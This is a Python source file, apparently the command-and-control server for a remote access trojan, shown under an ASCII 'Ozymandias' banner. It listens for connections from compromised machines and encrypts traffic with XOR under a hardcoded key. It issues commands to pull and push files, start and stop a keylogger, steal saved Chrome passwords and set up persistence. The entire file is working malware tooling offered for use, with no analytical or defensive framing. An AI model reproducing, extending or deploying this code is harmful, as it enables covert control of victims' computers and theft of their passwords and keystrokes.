import socket
import base64
import time
import os
# Bannière
RED = "\33[91m"
RED = "\33[91m"
BLUE = "\33[94m"
GREEN = "\033[32m"
YELLOW = "\033[93m"
PURPLE = '\033[0;35m'
CYAN = "\033[36m"
END = "\033[0m"




banner = f""" {RED}_____                                                   __
/\  __`\                                                /\ \  __
\ \ \/\ \  ____   __  __    ___ ___      __      ___    \_\ \/\_\     __      ____
 \ \ \ \ \/\_ ,`\/\ \/\ \ /' __` __`\  /'__`\  /' _ `\  /'_` \/\ \  /'__`\   / ',__\\
  \ \ \_\ \/_/  /\ \ \_\ \/\ \/\ \/\ \/\ \L\.\_/\ \/\ \/\ \L\ \ \ \/\ \L\.\_/\__, `\\
   \ \_____\/\____\/`____ \ \_\ \_\ \_\ \__/.\_\ \_\ \_\ \___,_\ \_\ \__/.\_\/\____/
    \/_____/\/____/`/___/> \/_/\/_/\/_/\/__/\/_/\/_/\/_/\/__,_ /\/_/\/__/\/_/\/___/
                      /\___/
                      \/__/                                                        {END}"""

print(banner)

# Clé AES (32 bytes de long)

key = b'V\xff&2\xf7[\xb4O\x98\rYx\xb5\x88#M\xc2\xc7\x8b,\xc07Y.)\xfc\xf5\xc1\xd8p\xcf\xd4'

def encrypt(key, data):
    key_len = len(key)
    encrypted = bytearray()
    for i, byte in enumerate(data.encode('utf-8')):
        encrypted.append(byte ^ key[i % key_len])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt(key, encrypted_data):
    encrypted_data = base64.b64decode(encrypted_data)
    key_len = len(key)
    decrypted = bytearray()
    for i, byte in enumerate(encrypted_data):
        decrypted.append(byte ^ key[i % key_len])
    return decrypted.decode('utf-8')


def start_server():
    global client_socket
    server_address = ('0.0.0.0', 9876)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(server_address)
    server.listen(5)
    print("Listening on {}:{}".format(*server_address))
    while True:
        client_socket, addr = server.accept()
        print("Accepted connection from {}:{}".format(addr[0], addr[1]))
        while True:
            try:
                data = client_socket.recv(8192).decode('utf-8')
                if data:
                    decrypted_data = decrypt(key, data)
                    print("\n".join(decrypted_data.strip().split('\n')[:-1]))
                    response = ""
                    while not response:
                        response = input(decrypted_data.strip().split('\n')[-1])
                        if response.lower() == "help":
                            print("""The commands are :
                            Upload <filename> 'will transfet a file from you to the target'
                            Download <filename> 'will transert a file from the target to you'
                            StartKeylog 'start a keylogger'
                            StopKeylog 'stop the keylogger'
                            StealChromepass 'try to steal chrome pass if possible'
                            Percistence 'try to enable percistence'
                            """)
                            response = ""

                    if response.split(" ")[0].lower() == "download":
                        encrypted_response = encrypt(key, response)
                        client_socket.sendall(encrypted_response.encode('utf-8').strip())
                        time.sleep(0.1)
                        filename = response.split(" ")[1].replace("\n", "")
                        data = client_socket.recv(8192).decode('latin-1')
                        filecontent = ""
                        while decrypt(key, data) != "END":
                            filecontent += decrypt(key, data)
                            data = client_socket.recv(4096).decode('latin-1')
                            print(filecontent)
                        print(filecontent)
                        with open(filename, 'w') as fichier:
                            fichier.write(filecontent)
                    elif response.split(" ")[0].lower() == "upload":
                        encrypted_response = encrypt(key, response)
                        client_socket.sendall(encrypted_response.encode('utf-8').strip())
                        time.sleep(0.1)
                        send_file(response.split(" ")[1].lower())
                    else:
                        encrypted_response = encrypt(key, response)
                        client_socket.sendall(encrypted_response.encode('utf-8').strip())
                        time.sleep(0.03)
                else:
                    break
            except Exception as e:
                print(f"Error: {e}")
                break



def send_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            while (chunk := file.read(4096)):
                time.sleep(0.2)
                print(chunk.decode('latin-1'))
                client_socket.sendall(encrypt(key, chunk.decode('latin-1')).encode('latin-1'))
            client_socket.sendall(encrypt(key, "END").encode('latin-1'))
    else:
        client_socket.sendall(encrypt(key, "File not found.\n").encode('latin-1'))

if __name__ == "__main__":
    start_server()
